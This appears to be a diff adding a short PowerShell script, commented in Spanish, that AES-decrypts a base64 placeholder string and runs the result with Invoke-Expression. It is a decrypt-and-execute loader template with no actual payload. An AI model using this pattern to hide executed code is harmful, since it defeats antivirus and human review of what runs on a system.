@@ -1,0 +1,22 @@
+# Texto encriptado (de la parte de encriptación)
+$encryptedText = "AQUI_VA_EL_TEXTO_ENCRIPTADO_GENERADO"
+
+# Convertir de base64 a bytes
+$encryptedBytes = [Convert]::FromBase64String($encryptedText)
+
+# Usar la clave y el IV generados
+$key = [Convert]::FromBase64String("TU_CLAVE_BASE64")
+$iv = [Convert]::FromBase64String("TU_IV_BASE64")
+
+$aes = [System.Security.Cryptography.Aes]::Create()
+$aes.Key = $key
+$aes.IV = $iv
+
+$decryptor = $aes.CreateDecryptor()
+$decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
+
+# Convertir a string
+$decryptedText = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
+
+# Ejecutar el código desencriptado
+Invoke-Expression $decryptedText
